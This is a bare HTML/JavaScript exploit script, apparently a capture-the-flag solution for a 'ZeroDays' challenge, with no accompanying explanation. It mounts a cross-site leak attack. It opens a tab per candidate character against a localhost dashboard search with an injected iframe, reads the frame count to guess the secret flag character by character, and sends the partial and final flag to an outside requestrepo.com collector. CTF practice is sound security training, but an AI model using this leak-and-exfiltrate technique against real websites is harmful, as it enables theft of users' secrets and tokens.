```html
<script>
var FLAG = "ZeroDays{";

(async () => {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789_}';

  while (!FLAG.endsWith('}')) {
    const tabs = [];
    fetch(`https://izcqzukv.requestrepo.com/${FLAG}`)

    // Open tabs for all candidate chars based on current FLAG tail
    for (const ch of chars) {
      const url = "http://localhost:3000/dashboard?s=[Z<iframe></iframe>]" + FLAG.slice(1) + ch;
      const tab = window.open(url, '_blank');
      if (!tab) {
        console.log("Popup/tab blocked for char: " + ch);
        continue;
      }
      tabs.push({ ch, tab });
    }

    // Wait to let tabs load
    await new Promise(r => setTimeout(r, 2500));

    let found = false;
    for (const { ch, tab } of tabs) {
      if (tab.length === 0) {
        FLAG += ch;
        found = true;
        console.log("Found char:", ch, "FLAG now:", FLAG);
        break;
      }
    }

    // Close ALL tabs after checking, regardless of match
    for (const { tab } of tabs) {
      try { tab.close(); } catch {}
    }

    if (!found) {
      console.log("No matching char found; aborting.");
      break;
    }
  }

  fetch(`https://izcqzukv.requestrepo.com/${btoa(FLAG)}`)
  await new Promise(r => setTimeout(r, 500));

})();
</script>
```